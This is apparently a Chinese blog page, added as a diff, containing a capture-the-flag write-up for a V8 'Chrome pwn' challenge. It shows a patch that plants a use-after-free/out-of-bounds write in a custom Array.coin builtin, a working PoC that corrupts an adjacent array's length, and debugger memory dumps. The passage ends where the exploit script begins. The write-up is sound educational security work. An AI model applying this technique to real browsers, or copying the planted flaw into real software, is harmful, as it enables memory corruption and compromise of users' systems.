@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="环境搭建使用如下方法编译 1234567891011git reset --hard 0ec93e047216979431bd6f147ab5956bb729afa2gclient sync# 加入patch，编译release版本的d8git apply --ignore-space-change --ignore-whitespace ..&#x2F;diff.patchtools&#x2F;dev&#x2F;v8gen.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数字经济线下-Chrome pwn">
+<meta property="og:url" content="http://example.com/2023/11/20/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Chrome-pwn/index.html">
+<meta property="og:site_name" content="蓝桉&#39;s blog">
+<meta property="og:description" content="环境搭建使用如下方法编译 1234567891011git reset --hard 0ec93e047216979431bd6f147ab5956bb729afa2gclient sync# 加入patch，编译release版本的d8git apply --ignore-space-change --ignore-whitespace ..&#x2F;diff.patchtools&#x2F;dev&#x2F;v8gen.">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-11-19T22:41:49.000Z">
+<meta property="article:modified_time" content="2025-02-02T08:55:07.502Z">
+<meta property="article:author" content="蓝桉">
+<meta property="article:tag" content="v8">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2023/11/20/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Chrome-pwn/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2023/11/20/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Chrome-pwn/","path":"2023/11/20/数字经济线下-Chrome-pwn/","title":"数字经济线下-Chrome pwn"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>数字经济线下-Chrome pwn | 蓝桉's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="蓝桉's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">蓝桉's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">蓝桉</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/20/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Chrome-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="蓝桉">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="蓝桉's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="数字经济线下-Chrome pwn | 蓝桉's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          数字经济线下-Chrome pwn
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-11-20 06:41:49" itemprop="dateCreated datePublished" datetime="2023-11-20T06:41:49+08:00">2023-11-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-02-02 16:55:07" itemprop="dateModified" datetime="2025-02-02T16:55:07+08:00">2025-02-02</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用如下方法编译</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 0ec93e047216979431bd6f147ab5956bb729afa2</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入patch，编译release版本的d8</span></span><br><span class="line">git apply --ignore-space-change --ignore-whitespace ../diff.patch</span><br><span class="line">tools/dev/v8gen.py x64.release </span><br><span class="line">ninja -C out.gn/x64.release d8</span><br><span class="line"><span class="comment">#该题其实不能使用debug版本的v8，只能使用release版本的v8</span></span><br><span class="line"><span class="comment"># 编译debug版本的d8</span></span><br><span class="line">tools/dev/v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>题目给出的<code>patch</code>文件如下</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index e6ab965a7e.<span class="number">.9e5</span>eb73c34 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ <span class="number">-362</span>,<span class="number">6</span> +<span class="number">362</span>,<span class="number">36</span> @@ <span class="function">V8_WARN_UNUSED_RESULT Object <span class="title">GenericArrayPush</span><span class="params">(Isolate* isolate,</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125; <span class="comment">// namespace</span></span></span></span><br><span class="line"><span class="params"><span class="function"> </span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="comment">// Vulnerability is here</span></span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="comment">// You can&#x27;t use this vulnerability in Debug Build :)</span></span></span></span><br><span class="line"><span class="params"><span class="function">+BUILTIN(ArrayCoin) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="type">uint32_t</span> len = args.length();</span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="keyword">if</span> (len != <span class="number">3</span>) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="comment">//判断参数是否为三个</span></span></span></span><br><span class="line"><span class="params"><span class="function">+     <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span></span></span><br><span class="line"><span class="params"><span class="function">+  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">+  Handle&lt;JSReceiver&gt; receiver;</span></span></span><br><span class="line"><span class="params"><span class="function">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span></span><br><span class="line"><span class="params"><span class="function">+         isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span></span><br><span class="line"><span class="params"><span class="function">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="comment">//将elements保存到局部变量</span></span></span></span><br><span class="line"><span class="params"><span class="function">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span></span><br><span class="line"><span class="params"><span class="function">+       </span></span></span><br><span class="line"><span class="params"><span class="function">+  Handle&lt;Object&gt; value;</span></span></span><br><span class="line"><span class="params"><span class="function">+  Handle&lt;Object&gt; length;</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//第一个参数设置为length</span></span></span></span><br><span class="line"><span class="params"><span class="function">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span></span><br><span class="line"><span class="params"><span class="function">+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//第二个为value</span></span></span></span><br><span class="line"><span class="params"><span class="function">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span></span><br><span class="line"><span class="params"><span class="function">+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">2</span>)));</span></span></span><br><span class="line"><span class="params"><span class="function">+</span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="type">uint32_t</span> array_length = <span class="keyword">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(array-&gt;length().Number());</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//判断数组长度是否大于37</span></span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="keyword">if</span>(<span class="number">37</span> &lt; array_length)&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//将数组第37个元素设置为value</span></span></span></span><br><span class="line"><span class="params"><span class="function">+    elements.set(<span class="number">37</span>, value-&gt;Number());</span></span></span><br><span class="line"><span class="params"><span class="function">+    <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span></span></span><br><span class="line"><span class="params"><span class="function">+  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="keyword">else</span>&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+    <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span></span></span><br><span class="line"><span class="params"><span class="function">+  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">+&#125;</span></span></span><br><span class="line"><span class="params"><span class="function">+</span></span></span><br><span class="line"><span class="params"><span class="function"> BUILTIN(ArrayPush) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">   HandleScope scope(isolate);</span></span></span><br><span class="line"><span class="params"><span class="function">   Handle&lt;Object&gt; receiver = args.receiver();</span></span></span><br><span class="line"><span class="params"><span class="function">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span></span><br><span class="line"><span class="params"><span class="function">index <span class="number">3412</span>edb89d.<span class="number">.1837771098</span> <span class="number">100644</span></span></span></span><br><span class="line"><span class="params"><span class="function">--- a/src/builtins/builtins-definitions.h</span></span></span><br><span class="line"><span class="params"><span class="function">+++ b/src/builtins/builtins-definitions.h</span></span></span><br><span class="line"><span class="params"><span class="function">@@ <span class="number">-367</span>,<span class="number">6</span> +<span class="number">367</span>,<span class="number">7</span> @@ <span class="keyword">namespace</span> internal &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="comment">/* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */</span>   \</span></span></span><br><span class="line"><span class="params"><span class="function">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span></span></span><br><span class="line"><span class="params"><span class="function">+  CPP(ArrayCoin)                                   \</span></span></span><br><span class="line"><span class="params"><span class="function">                                                                                \</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="comment">/* ArrayBuffer */</span>                                                            \</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="comment">/* ES #sec-arraybuffer-constructor */</span>                                        \</span></span></span><br><span class="line"><span class="params"><span class="function">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span></span><br><span class="line"><span class="params"><span class="function">index f5fa8f19fe.<span class="number">.03</span>a7b601aa <span class="number">100644</span></span></span></span><br><span class="line"><span class="params"><span class="function">--- a/src/compiler/typer.cc</span></span></span><br><span class="line"><span class="params"><span class="function">+++ b/src/compiler/typer.cc</span></span></span><br><span class="line"><span class="params"><span class="function">@@ <span class="number">-1701</span>,<span class="number">6</span> +<span class="number">1701</span>,<span class="number">8</span> @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">return</span> Type::Receiver();</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">case</span> Builtins::kArrayUnshift:</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">return</span> t-&gt;cache_-&gt;kPositiveSafeInteger;</span></span></span><br><span class="line"><span class="params"><span class="function">+    <span class="keyword">case</span> Builtins::kArrayCoin:</span></span></span><br><span class="line"><span class="params"><span class="function">+      <span class="keyword">return</span> Type::Receiver();</span></span></span><br><span class="line"><span class="params"><span class="function"> </span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="comment">// ArrayBuffer functions.</span></span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">case</span> Builtins::kArrayBufferIsView:</span></span></span><br><span class="line"><span class="params"><span class="function">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span></span><br><span class="line"><span class="params"><span class="function">index e7542dcd6b.<span class="number">.059</span>b54731b <span class="number">100644</span></span></span></span><br><span class="line"><span class="params"><span class="function">--- a/src/init/bootstrapper.cc</span></span></span><br><span class="line"><span class="params"><span class="function">+++ b/src/init/bootstrapper.cc</span></span></span><br><span class="line"><span class="params"><span class="function">@@ <span class="number">-1663</span>,<span class="number">6</span> +<span class="number">1663</span>,<span class="number">8</span> @@ <span class="type">void</span> Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="literal">false</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;copyWithin&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                           Builtins::kArrayPrototypeCopyWithin, <span class="number">2</span>, <span class="literal">false</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">+	SimpleInstallFunction(isolate_, proto, <span class="string">&quot;coin&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">+				Builtins::kArrayCoin, <span class="number">2</span>, <span class="literal">false</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;fill&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                           Builtins::kArrayPrototypeFill, <span class="number">1</span>, <span class="literal">false</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;find&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br></pre></td></tr></table></figure>
+<p>代码的主要漏洞存在调用<code>Object::ToNumber()</code>函数中，该函数可以通过<code>valueOf()</code>触发回调函数，在回调函数中重新设置数组的length，就可以让数组重新分配elements的内存空间。<br>如果最开始让数组的长度小于37，回调函数中将其设置为一个大于37的值，这样在判断数组长度的时候是满足大于37这个条件的，但是其中的set操作是对保存在局部变量中的elements进行操作的。由于数组重新分配了elements的空间，所以保存在局部变量中的elements相当于一个已经释放了的指针，对该指针指向的elements的第37个元素进行set操作，就会导致越界写数据。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>这个漏洞利用其实非常简单，我们可以在ToNumber的回调中增加数组的长度来让其重新分配空间造成UAF，如果数组开始的长度小于37则会发生越界写。如果越界写的长度刚好是另外一个数组的长度字段，那就有一个很大的数组越界了。<br>我们可以写一个POC来具体查看一下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> val = &#123;</span><br><span class="line">     <span class="attr">valueOf</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">          array.<span class="property">length</span> = <span class="number">0x100</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1024</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">array.<span class="title function_">coin</span>(<span class="number">34</span>, val);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;float_array length is &quot;</span> + float_array.<span class="property">length</span>);</span><br></pre></td></tr></table></figure>
+<p>输出如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./out/x64.release/d8 poc.js</span><br><span class="line">--&gt; float_array length is 1083179008</span><br></pre></td></tr></table></figure>
+<p>我们可以发现float_array的长度被改成了非常大的一个数字，那么造成这样的原因就是我们上述所说的漏洞。下面我们可以查看一下内存布局来看一下为什么数组大小为30</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x082944acbc99-1</span><br><span class="line">0x82944acbc98:  0x00001bbdfd4407b1      0x0000001e00000000</span><br><span class="line">0x82944acbca8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbcb8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbcc8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbcd8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbce8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbcf8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd08:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd18:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd28:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd38:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd48:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd58:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd68:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd78:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">pwndbg&gt; </span><br><span class="line">0x82944acbd88:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd98:  0x00001bbdfd4414a9      0x0000000200000000 </span><br><span class="line">0x82944acbda8:  0x3ff199999999999a      0x400199999999999a</span><br><span class="line">0x82944acbdb8:  0x00000681db9c2fc9      0x00001bbdfd440c21</span><br><span class="line">0x82944acbdc8:  0x0000082944acbd99      0x0000000200000000 --&gt; float_array length</span><br></pre></td></tr></table></figure>
+<p>我们可以数一下发现刚好第37个元素是float_array length，那么下面我们就可以编写我们的exp了</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span 